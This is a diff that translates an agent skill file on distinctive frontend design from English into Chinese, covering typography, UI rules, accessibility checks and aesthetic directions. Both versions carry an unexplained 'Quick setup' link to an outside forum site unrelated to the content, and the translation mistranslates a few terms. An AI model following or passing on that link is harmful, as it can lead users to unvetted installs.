@@ -1,37 +1,36 @@
 ---
 name: anthropic-frontend-design
-description: Create distinctive, production-grade frontend interfaces that avoid generic "AI slop" aesthetics. Combines the design intelligence of UI/UX Pro Max with Anthropic's anti-slop philosophy. Use for building UI components, pages, applications, or interfaces with exceptional attention to detail and bold creative choices.
+description: 设计出独具特色、符合生产级标准的前端界面，避免使用那些千篇一律、缺乏个性的“AI风格”设计。将 UI/UX Pro Max 的设计智慧与 Anthropic 的反平庸设计理念相结合，用于构建 UI 组件、页面或应用程序。在开发过程中，要注重细节处理，并大胆运用创新的设计手法。
 ---
 
-# Anthropic Frontend Design
-⏹ Quick setup here  -> https://openclawcli.forum
+# Anthropic 前端设计
+⏹ 快速入门请访问：https://openclawcli.forum
 
+本技能指南旨在帮助您创建具有独特风格、符合生产标准的前端界面，避免使用那些千篇一律的、缺乏个性的“AI设计”。它将结构化的设计理念（如可访问性、用户体验规则、技术栈指南）与鲜明、有目的性的美学风格相结合。
 
-This skill guides the creation of distinctive, production-grade frontend interfaces that avoid generic "AI slop" aesthetics. It integrates structured design intelligence (accessibility, UX rules, stack guidelines) with a bold, intentional aesthetic philosophy.
+## 核心理念：反对“AI设计的平庸化”
 
-## Core Philosophy: Anti-AI Slop
+Claude（以及所有AI助手）虽然具备出色的创造力，但往往倾向于使用安全、通用的设计模式。本技能要求您打破这些常规。
 
-Claude (and all AI agents) are capable of extraordinary creative work, yet often default to safe, generic patterns. This skill MANDATES breaking those patterns.
-
-- **AVOID**: Inter, Roboto, Arial, system fonts, purple-on-white gradients, cookie-cutter SaaS layouts, emojis as icons.
-- **MANDATE**: Unique typography, context-specific color schemes, intentional motion, unexpected spatial composition, and production-grade functional code.
-
----
-
-## Design Thinking Process
-
-Before coding, understand the context and commit to a BOLD aesthetic direction:
-
-1. **Purpose**: What problem does this solve? Who is it for?
-2. **Tone**: Pick an extreme direction—brutally minimal, maximalist chaos, retro-futuristic, organic, luxury, playful, editorial, etc.
-3. **Intelligence (Reference)**: Use the internal design tool to gather data (see below).
-4. **Differentiation**: What makes this UNFORGETTABLE?
+- **应避免的元素**：Inter字体、Roboto字体、Arial字体、纯白背景上的紫色渐变效果、千篇一律的SaaS界面布局、使用表情符号作为图标。
+- **必须采用的元素**：独特的字体设计、与场景相匹配的配色方案、有意图的动画效果、出人意料的视觉布局、以及符合生产标准的功能代码。
 
 ---
 
-## Design Intelligence Tool
+## 设计思维流程
 
-Use the internal search tool to gather palettes, font pairings, and UX guidelines. **CRITICAL: You MUST filter the results through the Anti-AI Slop lens.** If the tool suggests "Inter" or "Roboto", you are REQUIRED to ignore it and pick a distinctive alternative.
+在开始编码之前，先明确设计方向并坚持一种鲜明的美学风格：
+
+1. **设计目的**：这个设计要解决什么问题？目标用户是谁？
+2. **整体风格**：选择一种极端的风格方向——极简主义、极繁主义、复古未来主义、自然风格、奢华风格、趣味风格、编辑风格等。
+3. **设计参考**：使用内部的设计工具收集设计灵感（详见下文）。
+4. **独特性**：如何让这个设计令人难忘？
+
+---
+
+## 设计辅助工具
+
+使用内部搜索工具来获取配色方案、字体组合和用户体验指南。**重要提示：**在使用搜索结果时，必须从“反对AI设计的平庸化”的角度进行筛选。如果工具推荐使用Inter或Roboto字体，请务必忽略它们，选择其他更具特色的字体。
 
 ```bash
 # Generate a complete design system
@@ -46,57 +45,57 @@ python scripts/search.py "<keyword>" --stack <stack_name>
 
 ---
 
-## Implementation Standards
+## 实施标准
 
-### 1. Professional UI Rules
+### 1. 专业UI规范
 
-| Rule | Do | Don't |
-|------|----|----- |
-| **Icons** | Use SVG (Heroicons, Lucide, Simple Icons) | Use emojis like 🎨 🚀 ⚙️ as UI icons |
-| **Typography** | Beautiful, unique Google/Custom fonts | Inter, Roboto, Arial, System fonts |
-| **Hover** | Stable transitions (color/opacity/shadow) | Scale transforms that shift layout |
-| **Cursor** | Add `cursor-pointer` to all interactive items | Leave default cursor on buttons/cards |
-| **Contrast** | Minimum 4.5:1 for accessibility | Low-contrast "vibes" that are unreadable |
+| 规范 | 应遵循 | 不应遵循 |
+|------|----|-----|
+| **图标** | 使用SVG格式的图标（如Heroicons、Lucide、Simple Icons） | 不要将表情符号（如🎨、🚀、⚙️）用作UI图标 |
+| **字体** | 使用美观且独特的Google字体或自定义字体 | 使用Inter、Roboto、Arial、系统默认字体 |
+| **悬停效果** | 实现稳定的视觉过渡效果（如颜色变化、透明度变化、阴影效果） | 避免使用会导致界面布局混乱的缩放效果 |
+| **光标** | 为所有交互元素添加`cursor-pointer`光标 | 按钮和卡片上保留默认的光标样式 |
+| **对比度** | 保持至少4.5:1的对比度以确保可访问性 | 低对比度的设计会降低界面的可读性 |
 
-### 2. Motion & Animation
-- Prioritize CSS-only solutions where possible.
-- Focus on high-impact moments (staggered reveals on page load).
-- Use duration 150-300ms for micro-interactions.
+### 2. 动画效果
+- 尽可能优先使用纯CSS实现的动画效果。
+- 重点处理那些能产生强烈视觉冲击力的瞬间（例如页面加载时的动画效果）。
+- 微交互动画的持续时间应控制在150-300毫秒之间。
 
-### 3. Spatial Composition
-- Use asymmetry, overlap, or diagonal flow to break standard grids.
-- Balance generous negative space OR intentional density.
-
----
-
-## Pre-Delivery Checklist
-
-Before delivering code, verify every item:
-
-### Visual Quality
-- [ ] No emojis used as icons (SVG only).
-- [ ] Typography is characterful and NOT "AI standard".
-- [ ] Color scheme is unique to the context (no generic gradients).
-- [ ] Hover states provide clear, stable visual feedback.
-
-### UX & Accessibility
-- [ ] All interactive elements have `cursor-pointer`.
-- [ ] Form inputs have labels; images have alt text.
-- [ ] Text contrast meets 4.5:1 minimum (test Light/Dark modes).
-- [ ] Responsive at all breakpoints (375px, 768px, 1024px, 1440px).
-- [ ] No horizontal scroll on mobile.
+### 3. 视觉布局
+- 使用不对称布局、元素重叠或对角线布局来打破传统的网格结构。
+- 在保持足够空白空间的同时，也可以刻意增加视觉元素的密度。
 
 ---
 
-## Aesthetic Directions (Reference)
+## 交付前的检查清单
 
-- **Brutally Minimal**: Monochrome, extreme white space, sparse typography.
-- **Maximalist Chaos**: Overlapping elements, dense information, pattern mixing.
-- **Retro-Futuristic**: Chrome effects, neon accents, 80s-inspired.
-- **Luxury/Refined**: Gold/Dark accents, serif fonts, generous spacing.
-- **Playful/Toy-like**: Rounded corners, bright pastels, bouncy animations.
-- **Editorial/Magazine**: Grid-based, bold headlines, clean hierarchy.
-- **Brutalist/Raw**: Monospace fonts, harsh contrasts, industrial.
-- **Art Deco**: Sharp angles, metallic accents, ornate borders.
+在提交代码之前，请确保满足以下所有要求：
 
-*Commit to ONE direction and execute it fully—no half measures.*
+### 视觉质量
+- [ ] 不得使用表情符号作为图标（仅使用SVG格式的图标）。
+- [ ] 字体设计具有独特性，不符合“AI设计的通用标准”。
+- [ ] 配色方案与设计场景相匹配（避免使用通用的渐变效果）。
+- [ ] 悬停状态能提供清晰、稳定的视觉反馈。
+
+### 用户体验与可访问性
+- [ ] 所有交互元素都应显示`cursor-pointer`光标。
+- [ ] 表单输入框应配有标签；图片应带有alt文本。
+- [ ] 文本对比度至少达到4.5:1（在亮色/暗色模式下均需满足此要求）。
+- [ ] 界面在所有屏幕分辨率（375px、768px、1024px、1440px）下都能正常显示。
+- [ ] 移动设备上不允许出现水平滚动条。
+
+---
+
+## 可选的设计风格参考
+
+- **极简主义**：单色背景、极少的视觉元素、简洁的字体设计。
+- **极繁主义**：元素相互重叠、信息密度高、多种设计元素混合使用。
+- **复古未来主义**：采用Chrome浏览器特有的视觉效果、霓虹色调、80年代风格的元素。
+- **奢华/精致风格**：使用金色或深色调、带衬线的字体、合理的间距设计。
+- **趣味/儿童化风格**：圆角设计、明亮的淡色调、活泼的动画效果。
+- **编辑/杂志风格**：基于网格的布局、醒目的标题、清晰的层次结构。
+- **极简主义/原始风格**：等宽字体、强烈的视觉对比度、工业风格的设计元素。
+- **艺术装饰风格**：锐利的角度、金属质感的装饰元素、复杂的边框设计。
+
+*请坚持选择一种风格并彻底执行它——不要采用折中的方案。*
